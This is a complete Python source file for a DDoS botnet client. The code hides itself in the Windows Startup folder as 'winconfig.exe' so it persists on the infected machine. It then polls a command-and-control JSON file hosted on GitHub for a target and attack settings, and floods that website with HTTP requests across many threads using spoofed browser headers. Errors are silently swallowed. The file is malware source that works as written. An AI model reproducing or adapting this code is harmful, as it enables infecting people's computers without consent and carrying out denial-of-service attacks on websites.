
try:

    import threading, random, shutil, httpx, time, json, sys, os      

    class Headers:

        def GetRandomHeader():

            Headers =  [

                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive", 
                    "Upgrade-Insecure-Requests": "1",
                    "Cache-Control": "max-age=0",
                    "Origin": "https://openai.com",
                    "TE": "Trailers"
                },

                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",      
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Cache-Control": "max-age=0",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://youtube.com",
                    "Referer": "https://youtube.com/231321381328",
                    "DNT": "1",
                },

                {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Accept": "application/xml, text/xml, */*; q=0.01",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-GB,en;q=0.9",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Pragma": "no-cache",
                    "Expires": "0",
                    "X-Forwarded-For": "192.168.1.1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Content-Type-Options": "nosniff"
                }

            ]

            return random.choice(Headers)

    class Primary:

        def __init__(self, CentralizedServer="github.com.json"):

            self.CentralizedServer = CentralizedServer
            self.RequestAmountPerWorker = 5000
            self.WorkerAmountPerInfected = 25
            self.Attacking = False
            self.Website = None

        def Request(self):

            with httpx.Client() as Client:

                for _ in range(self.RequestAmountPerWorker):

                    Request = Client.get(self.Website, headers=Headers.GetRandomHeader(), follow_redirects=False)

        def Listen(self):

            while True:

                with httpx.Client() as Client:

                    time.sleep(5)

                    Request = Client.get(self.CentralizedServer)

                    if Request.status_code == 200:

                        AttackStatus = json.loads(Request.text)["attack"]

                        self.RequestAmountPerWorker = json.loads(Request.text)["request_amount_per_worker"]
                        self.WorkerAmountPerInfected = json.loads(Request.text)["worker_count_per_infected"]
                        self.Website = json.loads(Request.text)["website"]

                        Threads = []

                        if AttackStatus and not self.Attacking:

                            for _ in range(self.WorkerAmountPerInfected):

                                RequestThread = threading.Thread(target=self.Request)
                                RequestThread.start()
                                Threads.append(RequestThread)

                            self.Attacking = True

                        elif not AttackStatus:

                            for Thread in Threads:

                                Thread.join()

                            self.Attacking = False

        def Startup(self):

            if not os.path.exists(os.path.join(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), "winconfig.exe")):
                shutil.copy(sys.executable, os.path.join(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), "winconfig.exe"))

            return True

        def Main(self):

            NoReturn = self.Startup()

            if NoReturn:

                ListenThread = threading.Thread(target=self.Listen).start()

    Primary("https://raw.githubusercontent.com/----------/refs/heads/main/-----.json").Main()

except:

    pass
